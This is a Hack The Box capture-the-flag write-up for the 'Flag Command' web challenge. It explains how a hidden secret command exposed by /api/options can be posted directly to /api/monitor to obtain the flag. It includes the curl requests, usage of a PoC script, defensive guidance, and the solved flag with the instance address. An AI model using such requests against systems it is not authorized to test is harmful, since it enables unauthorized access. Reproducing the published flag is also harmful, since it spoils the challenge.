# Flag Command (Hack The Box) - Professional PoC Writeup

## Challenge Profile

| Field | Value |
|---|---|
| Challenge | Flag Command |
| Category | Web |
| Vulnerability Class | Client-side trust boundary failure |
| Weakness Pattern | Hidden command exposed to clients |
| Primary endpoints | `GET /api/options`, `POST /api/monitor` |

## Scope And Ethics

This material is for authorized CTF infrastructure only. Do not run this PoC
against systems you do not own or have explicit permission to test.

## Technical Summary

The challenge presents a terminal-style game where users appear to progress by
issuing step-based commands. However, frontend JavaScript fetches all commands
from `GET /api/options`, including a hidden `secret` command list. The backend
directly accepts commands posted to `POST /api/monitor`, so the secret command
can be submitted immediately to retrieve the flag.

## Vulnerable Behavior

1. Frontend code references `availableOptions['secret']`.
2. API response from `/api/options` includes a hidden command string.
3. Backend accepts that command without requiring normal game progression.
4. Response message from `/api/monitor` returns `HTB{...}`.

## Manual Verification Steps

1. Inspect frontend logic:

```bash
curl -s "http://<HOST>:<PORT>/static/terminal/js/main.js"
```

Look for logic equivalent to:
`availableOptions[currentStep].includes(currentCommand) || availableOptions['secret'].includes(currentCommand)`

2. Enumerate backend command source:

```bash
curl -s "http://<HOST>:<PORT>/api/options"
```

The JSON includes:
`allPossibleCommands.secret[0]`

3. Submit the secret command directly:

```bash
curl -s -X POST "http://<HOST>:<PORT>/api/monitor" \
  -H 'Content-Type: application/json' \
  -d '{"command":"Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}'
```

Expected signal:
response `message` contains `HTB{...}`.

## Automated PoC

Script:
`flag_command_poc.sh`

### Usage

```bash
cd "/home/eliah/Desktop/CTF/HackTheBox/Flag_Command"
chmod +x flag_command_poc.sh
./flag_command_poc.sh <host> <port>
```

### Common examples

```bash
./flag_command_poc.sh 154.57.164.79 31449
./flag_command_poc.sh --host 154.57.164.79 --port 31449 --verbose
./flag_command_poc.sh --host 154.57.164.79 --port 31449 --json
./flag_command_poc.sh --host 154.57.164.79 --port 31449 --command "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"
```

### Options

- `--host <host>`: target host or IP.
- `--port <port>`: target TCP port.
- `--command <value>`: force a command value instead of auto-reading from API.
- `--timeout <seconds>`: HTTP timeout, default `10`.
- `--skip-check`: skip frontend behavior check.
- `--json`: machine-readable JSON output.
- `--verbose`: print debug details.
- `-h`, `--help`: show usage help.

### Exit codes

- `0`: exploit succeeded and flag extracted.
- `2`: invalid CLI arguments.
- `3`: target connectivity failure.
- `4`: `/api/options` request or parse failure.
- `5`: secret command not found in API response.
- `6`: exploit request succeeded but no `HTB{...}` token found.

## Why The Exploit Works

- Hidden functionality is delivered to untrusted clients.
- Client-side checks are treated as security controls.
- Backend does not enforce progression state before processing command input.

## Defensive Guidance

- Never treat client-hidden values as secrets.
- Enforce command authorization and state transitions on the server.
- Return only currently permitted commands from backend APIs.
- Add server-side allowlists tied to authenticated session state.

## Result Note

Flag values are instance-specific. The format remains `HTB{...}`.

## Final Flag

Target instance: `http://154.57.164.79:31449`  
Solved on: `2026-04-02`  
Flag: `HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!_7730bc153c6352510ab3fab44c286ba6}`
